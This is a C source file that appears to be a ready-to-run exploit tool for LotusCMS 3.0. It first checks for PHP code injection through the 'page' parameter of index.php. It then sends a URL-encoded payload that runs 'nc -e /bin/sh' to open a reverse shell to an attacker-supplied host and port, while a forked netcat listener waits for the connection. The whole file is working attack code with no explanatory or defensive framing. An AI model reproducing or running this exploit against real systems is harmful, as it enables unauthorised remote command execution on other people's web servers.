#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>

#define MAX 2048

// Colours
#define RED_COLOUR    "\e[0;31m"
#define YELLOW_COLOUR "\e[0;33m"
#define GRAY_COLOUR   "\e[0;37m"
#define END_COLOUR    "\e[0m"

void exploit(char *url, char *lhost, char *lport) {

  pid_t pid;

  if((pid = fork()) == -1) {
    fprintf(stderr, RED_COLOUR"[-] Unable to fork the process\n"END_COLOUR);
    exit(5);
  }

  if(pid == 0) {

    CURL *curl;
    char payload[MAX] = "";

    curl_global_init(CURL_GLOBAL_ALL);
    if((curl = curl_easy_init()) == NULL) {
      fprintf(stderr, RED_COLOUR"[-] Unable to create curl handler\n"END_COLOUR);
      exit(3);
    }

    strcat(payload, url);
    strcat(payload, "/index.php?page=index%27%29%3B%24%7Bsystem%28%27nc%20-e%20%2fbin%2fsh%20");
    strcat(payload, lhost);
    strcat(payload, "%20");
    strcat(payload, lport);
    strcat(payload, "%27%29%7D%3B%23%22");

    close(STDOUT_FILENO);

    curl_easy_setopt(curl, CURLOPT_URL, payload);
    curl_easy_perform(curl);

    curl_easy_cleanup(curl);
    curl_global_cleanup();

  }else {

    char *args[] = {"nc", "-nlvp", lport, NULL};
    execvp("nc", args);

  }

}

void check_vuln(char *url) {

  CURL *curl;
  FILE *fp;
  char test[MAX] = "";
  char f_content[MAX];

  curl_global_init(CURL_GLOBAL_ALL);
  if((curl = curl_easy_init()) == NULL) {
    fprintf(stderr, RED_COLOUR"[-] Unable to create curl handler\n"END_COLOUR);
    exit(3);
  }

  if((fp = fopen("curl_output.txt", "w+")) == NULL) {
    fprintf(stderr, RED_COLOUR"[-] Unable to create temp file\n"END_COLOUR);
    exit(4);
  }

  strcat(test, url);
  strcat(test, "/index.php?page=index%27%29%3B%24%7Bprint%28%27Vulnerable%27%29%7D%3B%23");

  curl_easy_setopt(curl, CURLOPT_URL, test);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
  curl_easy_perform(curl);

  fseek(fp, -10, SEEK_END);
  fgets(f_content, MAX, fp); 
  system("rm curl_output.txt");

  if(strstr(f_content, "Vulnerable") == NULL) {
    fprintf(stderr, RED_COLOUR"[-] Target is not vulnerable\n"END_COLOUR);
    exit(4);
  }

  fclose(fp);

}

void check_url(char *url) {

  if(strstr(url, "http://") == NULL && strstr(url, "https://") == NULL) {
    fprintf(stderr, RED_COLOUR"[-] Error. Expected http:// or https://\n"END_COLOUR);
    exit(2);
  }

}

int main(int argc, char **argv) {

  if(argc != 4) {
    fprintf(stderr, RED_COLOUR"[-] Error. Incorrect number of arguments specified\n"END_COLOUR);
    fprintf(stderr, YELLOW_COLOUR"[?]"END_COLOUR GRAY_COLOUR" Usage: ./lotuscms-3.0 <url> <lhost> <lport>\n"END_COLOUR);
    return 1;
  }

  check_url(argv[1]);
  check_vuln(argv[1]);
  exploit(argv[1], argv[2], argv[3]);

  return 0;

}
